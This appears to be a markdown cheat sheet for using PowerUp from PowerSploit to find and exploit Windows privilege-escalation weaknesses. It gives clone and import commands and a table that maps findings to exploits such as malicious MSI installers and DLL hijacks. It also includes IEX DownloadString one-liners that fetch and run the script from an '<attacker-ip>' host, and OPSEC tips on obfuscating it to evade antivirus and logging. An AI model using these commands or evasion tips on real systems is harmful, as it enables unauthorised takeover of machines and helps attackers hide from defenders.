
## 🧰 What PowerUp Does

PowerUp checks for:

- 🛠️ Unquoted service paths
- 🔒 Weak service permissions
- 🧑‍💼 Insecure registry permissions
- 🧾 Credential files (e.g., `unattend.xml`)
- 🧰 AlwaysInstallElevated misconfig
- 🪛 DLL hijacking opportunities
- 🖥️ Startup applications & autoruns

---

## 📦 Download & Setup

Clone the repository:
```
git clone https://github.com/PowerShellMafia/PowerSploit.git
cd PowerSploit/Privesc
```

Or download only PowerUp:
```
# From PowerShell (attacker machine)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -OutFile "PowerUp.ps1"
```

## ⚙️ Execution Options

### Import the Module
```
Import-Module .\PowerUp.ps1
```

### Run All Checks
```
Invoke-AllChecks
```
🚨 This will run the full suite of escalation checks and highlight potential vectors.

## 🔍 Useful Functions

|Function|Description|
|---|---|
|`Invoke-AllChecks`|Run all escalation checks|
|`Invoke-ServiceUnquoted`|Find unquoted service paths|
|`Invoke-ServiceWeakPermissions`|Find services with weak permissions|
|`Get-ModifiablePath`|List modifiable directories in `PATH`|
|`Get-RegAlwaysInstallElevated`|Check AlwaysInstallElevated setting|
|`Get-UnattendedInstallFile`|Search for unattended install files|
|`Get-CachedGPPPassword`|Detect Group Policy password artifacts|
|`Invoke-DllHijack`|Discover vulnerable DLL hijack locations|
|`Get-ProcessTokenPrivilege`|Show token privileges for running processes|

### 🧪 Example Workflow
```
# Load PowerUp
Import-Module .\PowerUp.ps1

# Run all checks
Invoke-AllChecks

# Specific checks
Invoke-ServiceUnquoted
Get-RegAlwaysInstallElevated
```

## 🚀 Exploitation Opportunities

|Finding|Potential Exploit|
|---|---|
|Unquoted service path + writable dir|Replace EXE and restart service|
|Weak service permissions|Replace binary or change config|
|AlwaysInstallElevated|Create malicious MSI installer|
|Writable PATH entry|Drop malicious binary|
|Unattended install files|Extract plaintext passwords|
|DLL hijack|Place malicious DLL in load path|## 📁 Transferring to Target
### 📁 Transferring to Target
### Method: PowerShell Web Download
```
IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PowerUp.ps1')
Invoke-AllChecks
```

Or host it with Python:
```
python3 -m http.server 8080
```

```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>:8080/PowerUp.ps1')"
```

## 🛡️ OPSEC Considerations

- PowerUp is **noisy** — may trigger AV or logging
    
- Consider obfuscating or encoding the script
    
- Prefer offline analysis when possible









































































